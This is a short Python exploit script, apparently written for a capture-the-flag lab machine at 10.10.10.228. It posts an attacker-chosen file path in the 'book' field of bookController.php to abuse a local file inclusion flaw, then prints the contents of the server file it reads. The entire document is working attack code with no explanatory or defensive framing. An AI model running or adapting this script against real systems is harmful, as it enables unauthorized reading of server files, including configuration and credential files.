import requests as r
import sys

url = 'http://10.10.10.228/includes/bookController.php'


def lfi(file):
    data = {
        "title": "lfi",
        "author": "lfi",
        "method": 1,
        "book": file
    }

    rspn = r.post(url, data=data)
    cleaned = rspn.text.replace('\\r\\n', '\n').replace('\\', '')
    return cleaned


print(lfi(sys.argv[1])[1:-1])

